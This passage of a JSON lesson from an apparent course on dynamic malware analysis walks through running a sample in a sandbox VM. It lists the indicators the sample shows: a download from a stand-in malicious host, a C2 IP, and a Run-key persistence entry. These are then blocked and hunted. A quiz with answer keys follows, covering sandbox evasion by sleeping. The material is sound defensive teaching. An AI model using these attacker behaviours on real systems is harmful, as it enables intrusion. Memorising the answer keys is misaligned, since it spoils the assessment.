Restore snapshot \"Clean Analysis VM\"\n\n# 3. Transfer sample to VM\nscp suspicious.exe analyst@vm-ip:/home/analyst/\n\n# 4. Start monitoring\nStart Procmon, Wireshark, take Regshot 1st shot\n\n# 5. Execute\ndouble-click suspicious.exe\n\n# 6. Wait 10 minutes, observe behavior\n# Procmon shows:\n- Process creates cmd.exe → powershell.exe\n- Downloads http://malicious.com/payload.exe\n- Creates registry Run key\n- Connects to 203.0.113.42:8080\n\n# 7. Extract IOCs\nC2: http://malicious.com/payload.exe\nC2 IP: 203.0.113.42:8080\nDropped file: C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.exe (hash: abc123...)\nPersistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update\n\n# 8. Block IOCs organization-wide\nFirewall: Block 203.0.113.42\nDNS: Sinkhole malicious.com\nEDR: Block hash abc123...\nSIEM: Alert on registry key creation\n\n# 9. Hunt for compromise\nSearch SIEM for:\n- Connections to 203.0.113.42\n- DNS queries for malicious.com\n- File hash abc123...\n- Registry key HKCU\\...\\Run\\Update\n```\n\n**Impact**: Dynamic analysis extracted IOCs within 15 minutes, enabling immediate blocking and threat hunting.\n\n## Words of Encouragement\n\nDynamic analysis seems scary - you're literally running malware!\n\nBut with proper isolation, it's safe. And it's POWERFUL.\n\nStatic analysis told you malware COULD connect to C2, exfiltrate data, and persist. Dynamic analysis PROVES it, gives you the exact C2 IP, the exact persistence mechanism, the exact dropped files.\n\n**That's the difference between hypothesis and evidence.**\n\nStart simple:\n- Build a VM\n- Run one sample\n- Extract one IOC\n\n**That one IOC can block the same malware across your entire organization.**\n\nEvery analysis makes you better. Every IOC protects more systems.\n\n**Welcome to dynamic malware analysis. Now go detonate some malware (safely).**"
      }
    },
    {
      "type": "video",
      "title": "Video Tutorial: Dynamic Malware Analysis",
      "content": {
        "resources": "Watch this comprehensive video tutorial to reinforce your learning with visual demonstrations and practical examples.\n\n**Video**: [Dynamic Malware Analysis by OALabs](https://www.youtube.com/watch?v=q-97K7ZKWfI)\n\n**What you'll see:**\nDynamic analysis in sandboxes: Cuckoo, ANY.RUN, process monitoring, network traffic capture, memory forensics.\n\n**Duration**: ~35 minutes\n\n**Recommended viewing**: After completing the lesson to solidify understanding.\n\n**Additional Resources:**\n- [Cuckoo Sandbox](https://cuckoosandbox.org/)\n- [ANY.RUN Interactive Sandbox](https://any.run/)\n- [Volatility Memory Forensics](https://www.volatilityfoundation.org/)"
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "What is the primary advantage of dynamic analysis over static analysis?",
      "options": [
        "Dynamic analysis is always faster than static analysis",
        "Dynamic analysis reveals actual runtime behavior, working even on packed malware",
        "Dynamic analysis is safer because malware never actually executes",
        "Dynamic analysis requires no specialized tools or equipment"
      ],
      "correct_answer": 1,
      "explanation": "Dynamic analysis reveals actual runtime behavior by executing malware in a controlled environment. It works on packed/obfuscated malware that static analysis can't penetrate. However, it requires isolation (not safer), takes longer (not faster), and requires specialized sandbox environments.",
      "difficulty": 2
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "What are the five key areas to monitor during dynamic malware analysis?",
      "options": [
        "Processor, RAM, Disk, Network, GPU",
        "Process, File, Registry, Network, Memory",
        "Static, Dynamic, Hybrid, Automated, Manual",
        "Collection, Analysis, Documentation, Reporting, Response"
      ],
      "correct_answer": 1,
      "explanation": "The five key monitoring areas are: Process (activity), File (system changes), Registry (modifications), Network (communications), and Memory (injections and artifacts). Remember: PFRNM.",
      "difficulty": 2
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "Why might malware include a long sleep() command before executing its malicious payload?",
      "options": [
        "To reduce CPU usage and avoid detection",
        "To evade automated sandboxes that have limited analysis time",
        "To synchronize with other infected systems",
        "To wait for antivirus definitions to update"
      ],
      "correct_answer": 1,
      "explanation": "Malware often sleeps for extended periods (30+ minutes) to evade automated sandboxes, which typically analyze samples for only 5-15 minutes. If malware sleeps for an hour, the sandbox times out before seeing malicious behavior.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "What Volatility command would you use to find network connections in a memory dump?",
      "options": [
        "vol -f memory.dmp windows.netstat",
        "vol -f memory.dmp windows.connections",
        "vol -f memory.dmp windows.netscan",
        "vol -f memory.dmp windows.network"
      ],
      "correct_answer": 2,
      "explanation": "The correct command is 'vol -f memory.dmp windows.netscan' which scans memory for TCP/UDP connections and listening sockets, revealing network activity including C2 connections.",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}